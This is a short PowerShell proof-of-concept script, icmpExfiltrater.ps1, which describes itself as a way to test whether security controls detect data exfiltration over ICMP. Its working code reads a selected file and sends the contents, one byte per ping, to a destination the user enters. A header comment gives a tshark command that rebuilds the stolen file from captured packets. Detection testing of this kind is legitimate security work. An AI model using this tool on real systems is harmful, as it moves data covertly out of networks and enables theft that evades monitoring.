<#                             
Author of icmpExfiltrater.ps1 script @cyb3rw01f
Last updated 05/19/2020

.SYNOPSIS 
This is a Proof of Concept. This file is for testing purposes only. Malicious use of this script is prohibitted. 

.DESCRIPTION
Exfiltrate selected data file using the ICMP protocol. 

This script can assist testing security controls ability to detect/alert based on data exfiltration using the ICMP protocol. 
This is very slow and noisy so it is highly suggested that only small files are used for testing.

On the receiving end run a tcpdump/tshark session to capture the incoming ICMP data. Once the transfer is complete you 
can use the below tshark command to extract the data back to its normal form. 

Using Tshark to extract the paylod from the icmp data field. 
tshark -r icmp.pcap -Y ip.src==8.8.8.8 -T fields -e data | xxd -r -p > data2
#>

$logo = @"
=================================================================
					     ___  _  __ 
	 ___ _   _| |__   ___ _ ____      __/ _ \/ |/ _|
	/ __| | | | '_ \ / _ \ '__\ \ /\ / / | | | | |_ 
       | (__| |_| | |_) |  __/ |   \ V  V /| |_| | |  _|
	\___|\__, |_.__/ \___|_|    \_/\_/  \___/|_|_|  
	      |___/                                      

=================================================================
                                 /\__/\ 
                                /      \ 
                               |  -  -  |
                     __________| \     /|
                   /              \ T / |
                 /                      |
                |  ||     |    |       /  
                |  ||    /______\     / |
                |  | \  |  /     \   /  |
                 \/   | |\ \      | | \ \
                      | | \ \     | |  \ \
                      | |  \ \    | |   \ \
                      '''   '''   '''    ' 
			     @cyberw01f
"@
$label = @"          
                      ICMP Data Exfiltrater
            Script is to be used for testing purposes
"@

Function Get-File
{
Add-Type -AssemblyName System.Windows.Forms
$fileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{
    Multiselect = $false # When set to $true multiple files can be chosen
    }
 
[void]$fileBrowser.ShowDialog()
 
$script:fileName = $fileBrowser.FileName;
$script:file = $fileBrowser.SafeFileName;
$script:data = (Get-Content $fileName -Raw) 

If($FileBrowser.FileNames -like "*\*") {
      # Select your file 
      $fileBrowser.FileName #Lists selected files (optional)
      }
 
 else {
    Write-Host -f Green  "File select cancelled by user"
    Exit
      }
 }

#nl variable simply does a carrage return / new line
$nl = [Environment]::NewLine
Write-Host -f Magenta $logo
Write-Host
Write-Host -f Green $label
$nl
$destination = read-host "PING destination Domain or IP address"
Get-File
$bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
$PingObj = New-Object System.Net.NetworkInformation.ping
ForEach ($line in $bytes) {$PingAnswer = $PingObj.Send("$destination", 1000, $line);} 
Write-Host "$_" $PingAnswer.Status;
